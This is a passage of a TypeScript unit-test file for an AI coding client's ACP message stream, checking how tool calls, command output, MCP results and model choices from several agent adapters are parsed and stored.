    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call', toolCallId: 'c', title: 'cinna_probe' } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBeNull()
  })

  it('answers null for a custom command and for a call it never saw', () => {
    expect(call('custom', { title: 'mcp.cinna.probe', rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
    expect(new AcpMessageStream({ launcher: 'codex' }).cinnaTool('nope')).toBeNull()
  })
})

describe('describeAcpToolCall', () => {
  it('names the tool and its most identifying argument, in either vocabulary', () => {
    expect(describeAcpToolCall('bash', { command: 'ls -la', cwd: '/tmp' })).toBe('bash: ls -la')
    expect(describeAcpToolCall('write', { filePath: '/tmp/a.txt' })).toBe('write: /tmp/a.txt')
    expect(describeAcpToolCall('Write', { file_path: '/tmp/a.txt' })).toBe('Write: /tmp/a.txt')
    expect(describeAcpToolCall('Bash', { description: 'Run the tests' })).toBe(
      'Bash: Run the tests'
    )
  })

  it('falls back to the bare name and truncates a long argument', () => {
    expect(describeAcpToolCall('spike-mcp_secret_number', {})).toBe('spike-mcp_secret_number')
    expect(describeAcpToolCall('Read')).toBe('Read')
    const long = describeAcpToolCall('bash', { command: 'x'.repeat(400) })
    // The limit is on the argument, ellipsis included.
    expect(long.length).toBe('bash: '.length + 160)
    expect(long.endsWith('…')).toBe(true)
  })
})

describe('a Skill call, as claude-agent-acp 0.76.0 sends it', () => {
  // The call opens with `rawInput: {}`; the skill's name arrives in a later
  // `tool_call_update`, with the title `Load skill: <name>`.
  const opened: SessionNotification = { sessionId: 'ses', update: {
    sessionUpdate: 'tool_call', toolCallId: 'toolu_skill', title: 'Load skill', kind: 'other', status: 'pending',
    rawInput: {}, content: [], _meta: { claudeCode: { toolName: 'Skill' } }
  } as SessionNotification['update'] }
  const filled: SessionNotification = { sessionId: 'ses', update: {
    sessionUpdate: 'tool_call_update', toolCallId: 'toolu_skill', title: 'Load skill: ledger-bot:erp-check',
    rawInput: { skill: 'ledger-bot:erp-check' }, _meta: { claudeCode: { toolName: 'Skill' } }
  } as SessionNotification['update'] }

  it('is narrated with its skill’s name', () => {
    // Mutation: drop `skill` from `describeAcpToolCall` and the line stays `Skill`.
    expect(describeAcpToolCall('Skill', { skill: 'ledger-bot:erp-check' })).toBe('Skill: ledger-bot:erp-check')
  })

  it('reaches the stored transcript with its input and its name', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const acc = new StreamPartsAccumulator()
    const port = { postMessage: (): void => {} }
    for (const n of [opened, filled]) {
      const update = stream.apply(n)
      if (update.message) acc.ingestMessage(update.message, port)
    }
    expect(acc.snapshotParts()).toEqual([{
      kind: 'tool', text: 'Skill: ledger-bot:erp-check', toolName: 'Skill', toolId: 'toolu_skill',
      toolInput: { skill: 'ledger-bot:erp-check' }
    }])
  })
})

describe('a command, as codex-acp 2.2.2 sends it to a client that is not AIR', () => {
  // `AcpToolCallRenderer.standardMeta` / `commandEndMeta` in the pinned
  // adapter: a command shown as a terminal opens with a `{type:'terminal'}`
  // content block, its output streams as `_meta.terminal_output_delta`, and the
  // completing update carries `_meta.terminal_exit` and no `rawOutput`. A
  // read/search/list command has no terminal: its completing update carries
  // `rawOutput: {exit_code}` and the whole output as one delta (contract
  // `codex.tool.command-output`).
  const ID = 'exec-0f1e'
  const opened: SessionNotification = { sessionId: 'thr', update: {
    sessionUpdate: 'tool_call', toolCallId: ID, status: 'in_progress', kind: 'execute', title: 'python3 run.py',
    content: [{ type: 'terminal', terminalId: ID }],
    rawInput: { command: "/bin/zsh -lc 'python3 run.py'", cwd: '/tmp/w' },
    _meta: { terminal_info: { cwd: '/tmp/w', terminal_id: ID } }
  } as unknown as SessionNotification['update'] }
  const delta = (data: string): SessionNotification => ({ sessionId: 'thr', update: {
    sessionUpdate: 'tool_call_update', toolCallId: ID,
    _meta: { terminal_output_delta: { data, terminal_id: ID } }
  } as unknown as SessionNotification['update'] })
  /** The end of a terminal command, with whatever output had not streamed yet. */
  const completed = (status: string, rest: string, exitCode: number): SessionNotification => ({ sessionId: 'thr', update: {
    sessionUpdate: 'tool_call_update', toolCallId: ID, status,
    _meta: {
      ...(rest ? { terminal_output_delta: { data: rest, terminal_id: ID } } : {}),
      terminal_exit: { exit_code: exitCode, signal: null, terminal_id: ID }
    }
  } as unknown as SessionNotification['update'] })

  const store = (notifications: SessionNotification[]): ReturnType<StreamPartsAccumulator['snapshotParts']> => {
    const stream = new AcpMessageStream({ launcher: 'codex' })
    const acc = new StreamPartsAccumulator()
    const port = { postMessage: (): void => {} }
    for (const n of notifications) {
      const update = stream.apply(n)
      if (update.message) acc.ingestMessage(update.message, port)
    }
    return acc.snapshotParts()
  }

  it('stores the streamed output as the call’s tool_result once the command ends', () => {
    const parts = store([opened, delta('slot='), delta('ok\n'), completed('completed', '', 0)])
    expect(parts.map((p) => p.kind)).toEqual(['tool', 'tool_result'])
    expect(parts[1]).toMatchObject({ kind: 'tool_result', text: 'slot=ok\n', toolId: ID, toolStream: 'stdout' })
    // Nothing is a result while the command still runs.
    expect(store([opened, delta('slot=')]).map((p) => p.kind)).toEqual(['tool'])
  })

  it('names a call by its title, not by the `name` codex-acp 2.x sends (`exec_command` for every command)', () => {
    const parts = store([{ sessionId: 'thr', update: { sessionUpdate: 'tool_call', toolCallId: 'call_7', name: 'exec_command', kind: 'read', title: "Read file '/w/a.md'", status: 'in_progress' } as unknown as SessionNotification['update'] }])
    expect(parts[0]).toMatchObject({ kind: 'tool', toolName: "Read file '/w/a.md'" })
    // Another engine's `name` still wins over its title.
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const named = stream.apply({ sessionId: 'thr', update: { sessionUpdate: 'tool_call', toolCallId: 'c', name: 'Read', title: 'Read a.md' } as unknown as SessionNotification['update'] })
    expect(named.message?.parts[0].metadata?.[TOOL_NAME_METADATA_KEY]).toBe('Read')
  })

  it('stores a read command’s output, sent whole on its completing update', () => {
    const parts = store([
      { sessionId: 'thr', update: { sessionUpdate: 'tool_call', toolCallId: 'call_5', name: 'exec_command', kind: 'read', title: "Read file '/w/SKILL.md'", status: 'in_progress', locations: [{ path: '/w/SKILL.md' }] } as unknown as SessionNotification['update'] },
      { sessionId: 'thr', update: { sessionUpdate: 'tool_call_update', toolCallId: 'call_5', status: 'completed', rawOutput: { exit_code: 0 }, _meta: { terminal_output_delta: { data: 'SKILL_OK\n', terminal_id: 'call_5' } } } as unknown as SessionNotification['update'] }
    ])
    expect(parts[1]).toMatchObject({ kind: 'tool_result', text: 'SKILL_OK\n', toolId: 'call_5', toolStream: 'stdout' })
  })

  it('keeps a non-zero exit code as the last line of a failed command', () => {
    const parts = store([opened, delta('Traceback: '), completed('failed', 'boom', 2)])
    expect(parts[1]).toMatchObject({ kind: 'tool_result', text: 'Traceback: boom\nExit code 2', toolStream: 'stderr' })
    expect(store([opened, completed('failed', '', 127)])[1]?.text).toBe('Exit code 127')
  })

  it('adds no exit-code line for a command the user stopped (exit -1), so it does not read as an error', () => {
    expect(store([opened, completed('failed', '', -1)]).map((p) => p.kind)).toEqual(['tool'])
    expect(store([opened, delta('partial\n'), completed('failed', '', -1)])[1]?.text).toBe('partial\n')
  })

  it('keeps the head and tail of an output over the limit, naming the gap', () => {
    const big = 'a'.repeat(TOOL_RESULT_LIMIT) + 'MIDDLE' + 'z'.repeat(TOOL_RESULT_LIMIT)
    const text = store([opened, delta(big.slice(0, 1000)), delta(big.slice(1000)), completed('completed', '', 0)])[1]!.text
    expect(text.length).toBeLessThan(TOOL_RESULT_LIMIT + 100)
    expect(text.startsWith('aaa')).toBe(true)
    expect(text.endsWith('zzz')).toBe(true)
    expect(text).toContain(`… ${big.length - TOOL_RESULT_LIMIT} characters left out …`)
    expect(capToolResult('short')).toBe('short')
  })

  it('holds a command’s streamed output to the limit while it runs, and stores what the whole output would cap to', () => {
    const stream = new AcpMessageStream({ launcher: 'codex' })
    const held = (stream as unknown as { commandOutput: Map<string, { head: string; tail: string; dropped: number }> }).commandOutput
    stream.apply(opened)
    const chunks = Array.from({ length: 40 }, (_, i) => `${String(i).padStart(2, '0')}:${'x'.repeat(8_000)}\n`)
    for (const chunk of chunks) {
      stream.apply(delta(chunk))
      const entry = held.get(ID)!
      expect(entry.head.length + entry.tail.length).toBeLessThanOrEqual(TOOL_RESULT_LIMIT)
    }
    const parts = store([opened, ...chunks.map(delta), completed('failed', 'end', 3)])
    expect(parts[1]!.text).toBe(capToolResult(`${chunks.join('')}end\nExit code 3`))
    // Under the limit nothing is dropped.
    expect(store([opened, delta('a'.repeat(1_000)), completed('completed', '', 0)])[1]!.text).toBe('a'.repeat(1_000))
  })

  it('drops a command’s held output once the call completes or fails', () => {
    const stream = new AcpMessageStream({ launcher: 'codex' })
    const held = (stream as unknown as { commandOutput: Map<string, unknown> }).commandOutput
    for (const status of ['completed', 'failed']) {
      stream.apply(opened)
      stream.apply(delta('partial'))
      expect(held.size).toBe(1)
      stream.apply(completed(status, 'rest', 1))
      expect(held.size).toBe(0)
    }
  })

  it('stores nothing for a silent command that succeeded', () => {
    expect(store([opened, completed('completed', '', 0)]).map((p) => p.kind)).toEqual(['tool'])
  })

  it('does not read the opening terminal reference as output', () => {
    // A call the adapter replays already completed still has only the reference.
    const done = { ...opened, update: { ...opened.update, status: 'completed' } } as SessionNotification
    expect(store([done]).map((p) => p.kind)).toEqual(['tool'])
  })

  it('stores the whole output the patched adapter puts on the completing update, head included, once', () => {
    // The CLI streamed only the tail; the patch's `rawOutput.formatted_output` is the item's whole output.
    const whole: SessionNotification = { sessionId: 'thr', update: {
      sessionUpdate: 'tool_call_update', toolCallId: ID, status: 'completed',
      rawOutput: { exit_code: 0, formatted_output: 'head\ntail\n' },
      _meta: { terminal_exit: { exit_code: 0, signal: null, terminal_id: ID } }
    } as unknown as SessionNotification['update'] }
    const parts = store([opened, delta('tail\n'), whole])
    expect(parts.filter((p) => p.kind === 'tool_result').map((p) => p.text)).toEqual(['head\ntail\n'])
  })

  it('reads a whole output in rawOutput first, so an engine sending both is not counted twice', () => {
    const both: SessionNotification = { sessionId: 'thr', update: {
      sessionUpdate: 'tool_call_update', toolCallId: ID, status: 'completed',
      rawOutput: { formatted_output: 'slot=ok\n', exit_code: 0 }
    } as unknown as SessionNotification['update'] }
    expect(store([opened, delta('slot='), delta('ok\n'), both])[1]?.text).toBe('slot=ok\n')
  })

  it('stores a background command’s output from the recorded fixture', () => {
    const stream = new AcpMessageStream({ launcher: 'codex' })
    const { messages } = foldAll(stream, load('codex', 'async_task_background_terminal'))
    const result = [...messages.values()].flat().find((p) => kindOf(p) === 'tool_result')
    expect(result?.text).toBe('probe-done\n')
    expect(toolIdOf(result!)).toBe('exec-d55ff8ab-5aaa-4c32-8823-f7f5de0dbd68')
  })

  it('flattens a function-call output given as input_text items', () => {
    const parts = store([
      { sessionId: 'thr', update: { sessionUpdate: 'tool_call', toolCallId: 'call_1', title: 'apply_patch', kind: 'other', status: 'in_progress' } as unknown as SessionNotification['update'] },
      { sessionId: 'thr', update: { sessionUpdate: 'tool_call_update', toolCallId: 'call_1', status: 'completed',
        rawOutput: { output: [{ type: 'input_text', text: 'Done.' }] } } as unknown as SessionNotification['update'] }
    ])
    expect(parts[1]).toMatchObject({ kind: 'tool_result', text: 'Done.' })
  })
})

describe('an MCP call, as codex-acp sends it (1.11.0 and 2.2.2 alike)', () => {
  // Watched in `make contract ENGINE=codex` (codex.tool.mcp-output): the
  // app-server item passes through as `rawOutput: { result, error }`.
  const ID = 'call_18'
  const input = { server: 'cinna', tool: 'probe', arguments: {} }
  const opened: SessionNotification = { sessionId: 'thr', update: {
    sessionUpdate: 'tool_call', toolCallId: ID, kind: 'execute', title: 'mcp.cinna.probe', status: 'in_progress',
    rawInput: input, _meta: { is_mcp_tool_call: true }
  } as unknown as SessionNotification['update'] }
  const done = (status: string, rawOutput: unknown): SessionNotification => ({ sessionId: 'thr', update: {
    sessionUpdate: 'tool_call_update', toolCallId: ID, status, rawInput: input, rawOutput
  } as unknown as SessionNotification['update'] })
  const result = (content: unknown[], structuredContent: unknown = null): Record<string, unknown> =>
    ({ result: { content, structuredContent, _meta: null }, error: null })

  const resultOf = (notifications: SessionNotification[]): PartLike | undefined => {
    const stream = new AcpMessageStream({ launcher: 'codex' })
    let parts: PartLike[] = []
    for (const n of notifications) parts = stream.apply(n).message?.parts ?? parts
    return parts.find((p) => kindOf(p) === 'tool_result')
  }

  it('stores the text content as the call’s tool_result', () => {
    const part = resultOf([opened, done('completed', result([{ type: 'text', text: 'HANDOVER_SESSION_first' }]))])
    expect(part?.text).toBe('HANDOVER_SESSION_first')
    expect(toolIdOf(part!)).toBe(ID)
    expect(part?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stdout')
  })

  it('stores a tool’s isError answer as stderr, from result.content', () => {
    const part = resultOf([opened, done('failed', result([{ type: 'text', text: 'HANDOVER_TOOL_FAILED' }]))])
    expect(part?.text).toBe('HANDOVER_TOOL_FAILED')
    expect(part?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stderr')
  })

  it('stores the call’s own error message', () => {
    expect(resultOf([opened, done('failed', { result: null, error: { message: 'tool call timed out' } })])?.text).toBe('tool call timed out')
  })

  it('falls back to structuredContent only when there is no content', () => {
    expect(resultOf([opened, done('completed', result([], { rows: 2 }))])?.text).toBe('{"rows":2}')
    expect(resultOf([opened, done('completed', result([{ type: 'text', text: 'two rows' }], { rows: 2 }))])?.text).toBe('two rows')
  })

  it('stores the output of a call replayed already completed (session/load)', () => {
    const replayed: SessionNotification = { sessionId: 'thr', update: {
      ...(opened.update as object), status: 'completed', rawOutput: result([{ type: 'text', text: 'HANDOVER_SESSION_first' }])
    } as unknown as SessionNotification['update'] }
    expect(resultOf([replayed])?.text).toBe('HANDOVER_SESSION_first')
  })
})

describe('resolveOfferedModel', () => {
  const options = (current: string, values: (string | { group: string[] })[]): unknown[] => [
    { id: 'mode', category: 'mode', currentValue: 'default', options: [] },
    { id: 'model', category: 'model', currentValue: current, options: values.map((v) =>
      typeof v === 'string' ? { value: v, name: v } : { group: 'g', name: 'Group', options: v.group.map((value) => ({ value, name: value })) }) }
  ]
  const CLAUDE = ['default', 'opus[1m]', 'sonnet', 'haiku']

  it('takes the exact value, then the same one ignoring case and a context hint', () => {
    expect(resolveOfferedModel(options('opus[1m]', CLAUDE), 'haiku')).toEqual({
      configId: 'model', current: 'opus[1m]', value: 'haiku', offered: CLAUDE
    })
    expect(resolveOfferedModel(options('default', CLAUDE), 'Sonnet')?.value).toBe('sonnet')
    expect(resolveOfferedModel(options('default', CLAUDE), 'opus')?.value).toBe('opus[1m]')
  })

  it('resolves a model id by its family word, never to default', () => {
    expect(resolveOfferedModel(options('default', CLAUDE), 'claude-haiku-4-5-20251001')?.value).toBe('haiku')
    expect(resolveOfferedModel(options('opus[1m]', CLAUDE), 'claude-default')?.value).toBeNull()
    expect(resolveOfferedModel(options('opus[1m]', CLAUDE), 'mythos-9')).toMatchObject({ value: null, offered: CLAUDE })
  })

  it('keeps the request’s context tier and generation in the family step', () => {
    // Mutation: drop the hint / version guards in `resolveOfferedModel` → `sonnet[1m]` and `opus[1m]`.
    const tiers = ['default', 'sonnet[1m]', 'sonnet', 'haiku']
    expect(resolveOfferedModel(options('default', tiers), 'claude-sonnet-4-5')?.value).toBe('sonnet')
    expect(resolveOfferedModel(options('default', tiers), 'claude-sonnet-4-5[1m]')?.value).toBe('sonnet[1m]')
    expect(resolveOfferedModel(options('default', ['default', 'opus[1m]', 'sonnet']), 'claude-opus-4-1')).toMatchObject({
      value: null, offered: ['default', 'opus[1m]', 'sonnet']
    })
    // A version in the name or description that differs from the request's.
    const described = [
      { id: 'model', category: 'model', currentValue: 'default', options: [
        { value: 'default', name: 'Default' },
        { value: 'opus', name: 'Opus', description: 'Opus 4.7 · Most capable' },
        { value: 'haiku', name: 'Haiku 4.5', description: 'Fastest' }
      ] }
    ]
    expect(resolveOfferedModel(described, 'claude-opus-4-1')?.value).toBeNull()
    expect(resolveOfferedModel(described, 'claude-opus-4-7')?.value).toBe('opus')
    expect(resolveOfferedModel(described, 'claude-haiku-4-5-20251001')?.value).toBe('haiku')
    expect(resolveOfferedModel(described, 'claude-haiku-3-5')?.value).toBeNull()
  })

  it('reads a grouped select, and answers null when there is no model option', () => {
    expect(resolveOfferedModel(options('a', [{ group: ['a', 'haiku'] }]), 'haiku')?.value).toBe('haiku')
    expect(resolveOfferedModel([{ id: 'mode', currentValue: 'default', options: [] }], 'haiku')).toBeNull()
    expect(resolveOfferedModel(undefined, 'haiku')).toBeNull()
  })
})

describe('Antigravity’s wire quirks', () => {
  const SESSION = '824fc7f9-f2dd-4602-ba7e-84ed932dae0d'
  const note = (update: Record<string, unknown>): SessionNotification =>
    ({ sessionId: SESSION, update }) as unknown as SessionNotification
  /** From a real 1.3.0 capture: an approved `create_file` ask, run under another id. */
  const APPROVED_EDIT = [
    note({ toolCallId: '97b6fe8b17d04ecfb3f60346af435cec', title: 'Run create_file?', kind: 'edit', status: 'pending', sessionUpdate: 'tool_call' }),
    note({ toolCallId: `${SESSION}:2`, title: 'Running edit_file', kind: 'edit', status: 'completed', rawOutput: 'Create probe.txt', sessionUpdate: 'tool_call' }),
    note({ toolCallId: '97b6fe8b17d04ecfb3f60346af435cec', status: 'failed', rawOutput: 'Tool call was approved but never executed.', sessionUpdate: 'tool_call_update' })
  ]

  it('draws no failed card for an approved ask whose work ran under another id', () => {
    // Mutation: drop the filter and the transcript shows the approved edit
    // failing, right beside the same edit succeeding.
    const stream = new AcpMessageStream({ launcher: 'antigravity' })
    const { messages } = foldAll(stream, { recording: null, note: '', notifications: APPROVED_EDIT })
    const parts = onlyMessage(messages)
    const results = parts.filter((part) => kindOf(part) === 'tool_result')
    expect(results.map((part) => part.text)).toEqual(['Create probe.txt'])
    expect(parts.some((part) => (part.text ?? '').includes('never executed'))).toBe(false)
  })

  it('keeps that update for every other engine, and keeps Antigravity’s other failures', () => {
    const other = new AcpMessageStream({ launcher: 'codex' })
    const { messages } = foldAll(other, { recording: null, note: '', notifications: APPROVED_EDIT })
    expect(onlyMessage(messages).some((part) => (part.text ?? '').includes('never executed'))).toBe(true)
    const stream = new AcpMessageStream({ launcher: 'antigravity' })
    const denied = foldAll(stream, { recording: null, note: '', notifications: [
      note({ toolCallId: 'call_1043524', title: 'view_file', kind: 'read', status: 'in_progress', sessionUpdate: 'tool_call' }),
      note({ toolCallId: 'call_1043524', status: 'failed', rawOutput: 'Access to path "/etc/hosts" is denied.', sessionUpdate: 'tool_call_update' })
    ] })
    expect(onlyMessage(denied.messages).filter((part) => kindOf(part) === 'tool_result').map((part) => part.text))
      .toEqual(['Access to path "/etc/hosts" is denied.'])
  })

  it('shows no output for a completed MCP call, whose rawOutput is the model’s own summary', () => {
    // Real 1.3.0 captures (contract `antigravity.mcp.result-not-delivered`):
    // asked (`_meta.mcp`) and unasked (`Running <tool>`). Mutation: drop the
    // check and "Probe summary" reads as what Cinna's tool returned.
    const stream = new AcpMessageStream({ launcher: 'antigravity' })
    const meta = { mcp: { tool: 'probe', server: 'cinna' }, is_mcp_tool_call: true }
    const { messages } = foldAll(stream, { recording: null, note: '', notifications: [
      note({ toolCallId: 'd5e31e81', title: 'cinna_probe', kind: 'other', status: 'pending', content: [], rawInput: { arguments: {} }, _meta: meta, sessionUpdate: 'tool_call' }),
      note({ toolCallId: 'd5e31e81', status: 'completed', content: [{ type: 'content', content: { type: 'text', text: 'Probe summary' } }], rawOutput: 'Probe summary', sessionUpdate: 'tool_call_update' }),
      note({ toolCallId: `${SESSION}:16`, title: 'Running probe', kind: 'other', status: 'in_progress', rawInput: {}, sessionUpdate: 'tool_call' }),
      note({ toolCallId: `${SESSION}:16`, status: 'completed', rawOutput: 'Probe summary', sessionUpdate: 'tool_call_update' })
    ] })
    const parts = onlyMessage(messages)
    expect(parts.filter((part) => kindOf(part) === 'tool')).toHaveLength(2)
    expect(parts.filter((part) => kindOf(part) === 'tool_result')).toEqual([])
  })

  it('reads a replayed call’s rawInput, which arrives as a JSON string', () => {
    const stream = new AcpMessageStream({ launcher: 'antigravity' })
    const { messages } = foldAll(stream, { recording: null, note: '', notifications: [
      note({ toolCallId: 'call_1000685', title: 'echo hi', kind: 'execute', status: 'completed',
        rawInput: '{"CommandLine":"echo hi","Cwd":"/tmp/ws","WaitMsBeforeAsync":5000}', sessionUpdate: 'tool_call' })
    ] })
    const call = onlyMessage(messages).find((part) => kindOf(part) === 'tool')
    expect(call?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({ CommandLine: 'echo hi', Cwd: '/tmp/ws', WaitMsBeforeAsync: 5000 })
  })
})
